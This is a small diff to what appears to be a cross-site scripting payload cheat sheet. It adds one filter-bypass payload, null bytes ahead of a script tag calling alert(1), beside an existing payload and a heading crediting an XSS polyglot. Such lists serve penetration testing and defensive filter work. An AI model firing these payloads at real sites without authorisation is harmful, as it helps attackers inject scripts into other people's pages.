@@ -22,6 +22,10 @@
 <script>alert(1)%0d%0a-->%09</script
 ```
 
+```html
+<x>%00%00%00%00%00%00%00<script>alert(1)</script>
+```
+
 **XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 ```
